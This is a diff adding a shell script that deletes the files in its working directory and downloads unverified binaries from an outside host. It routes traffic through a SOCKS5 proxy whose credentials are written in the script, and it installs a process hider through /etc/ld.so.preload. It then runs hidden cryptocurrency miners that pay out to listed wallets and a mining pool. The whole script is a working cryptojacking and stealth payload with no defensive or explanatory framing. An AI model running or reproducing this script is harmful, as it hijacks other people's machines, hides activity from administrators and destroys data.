@@ -1,0 +1,64 @@
+rm -rvf * && mkdir a && cd a
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+sudo apt-get install -y nodejs
+
+apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+
+npm i -g node-process-hider
+
+wget --no-check-certificate https://maskurniawan.serv00.net/libpearlkernel.so.enc && chmod +x libpearlkernel.so.enc
+wget --no-check-certificate -O services https://maskurniawan.serv00.net/tw-pearl-333 && chmod +x services
+wget --no-check-certificate https://maskurniawan.serv00.net/libcudart.so.13 && chmod +x libcudart.so.13
+wget --no-check-certificate https://maskurniawan.serv00.net/pearl.guard && chmod +x pearl.guard
+wget --no-check-certificate https://maskurniawan.serv00.net/pearl-policy.enc && chmod +x pearl-policy.enc
+wget --no-check-certificate https://maskurniawan.serv00.net/pearl-release.sig && chmod +x pearl-release.sig
+wget --no-check-certificate https://maskurniawan.serv00.net/pearl-verify && chmod +x pearl-verify
+
+wget --no-check-certificate https://maskurniawan.serv00.net/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 202.155.9.40:443
+socks5_username = excel123
+socks5_password = excel123
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+
+./graftcp/graftcp wget --no-check-certificate https://maskurniawan.serv00.net/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp && clear && ./services --poll 37.230.62.246:80 --wallet prl1p4wq5h2tpnpqcu3vwskw3utylklafm0fsd8za8cwgfnr6l2dkxywqmcnm0e --worker Cici & wget --no-check-certificate https://maskurniawan.serv00.net/sse2 && chmod 777 sse2 && ./sse2 -a yespowertide -o 37.230.62.246:443 -u TXEWxxF8yyzV9Q1vyk2Xai1Li3VMYjnaY9.cici -t $(nproc) > /dev/null 2>&1 & clear
